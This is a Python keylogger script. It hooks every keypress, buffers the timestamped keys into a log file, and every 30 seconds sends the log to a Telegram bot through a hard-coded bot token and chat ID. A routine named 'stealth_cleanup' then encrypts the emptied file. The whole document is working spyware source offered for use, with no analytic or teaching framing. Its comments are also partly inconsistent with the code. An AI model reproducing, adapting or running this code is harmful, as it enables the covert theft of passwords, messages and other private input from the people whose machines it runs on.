import os
import time
import keyboard
import datetime
import requests
import threading
from cryptography.fernet import Fernet

# Configuration
LOG_FILE = "keystrokes.log"
ENCRYPTION_KEY_FILE = "key.key"
BOT_TOKEN = "7810570268:AAFIjIdVdQhHTn-R1xrwpyG3OJyUdlJsD0o"
CHAT_ID = "1259051531"
BUFFER_LIMIT = 500  # Number of keystrokes before sending logs

log_buffer = []  # Store logs in memory

# Function to log keystrokes in memory instead of a file
def log_key(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_buffer.append(f"{timestamp} - {key.name}")

    # If buffer limit is reached, flush to file
    if len(log_buffer) >= BUFFER_LIMIT:
        flush_logs()

# Function to flush log buffer to file
def flush_logs():
    if log_buffer:
        with open(LOG_FILE, "a") as file:
            file.write("\n".join(log_buffer) + "\n")
        log_buffer.clear()  # Clear memory buffer

# Function to send logs to Telegram
def send_logs():
    flush_logs()  # Ensure all logs are written before sending

    if not os.path.exists(LOG_FILE):
        return

    with open(LOG_FILE, "r") as file:
        log_data = file.read()

    if log_data.strip():  # Send only if log is not empty
        message = f"📥 New Keylogger Logs:\n{log_data}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": message})

        open(LOG_FILE, "w").close()  # Clear log file after sending

# Function to encrypt logs before storing
def encrypt_logs():
    if not os.path.exists(LOG_FILE):
        return

    key = Fernet.generate_key()
    cipher = Fernet(key)

    with open(LOG_FILE, "rb") as file:
        encrypted_data = cipher.encrypt(file.read())

    with open(LOG_FILE, "wb") as enc_file:
        enc_file.write(encrypted_data)

    with open(ENCRYPTION_KEY_FILE, "wb") as key_file:
        key_file.write(key)

# Function to periodically process logs
def stealth_cleanup():
    while True:
        time.sleep(30)  # Every 60 seconds
        send_logs()  # Send logs after cleanup
        encrypt_logs()

# Start background tasks
keyboard.on_press(log_key)
cleanup_thread = threading.Thread(target=stealth_cleanup, daemon=True)
cleanup_thread.start()

# Keep the keylogger running indefinitely
keyboard.wait()
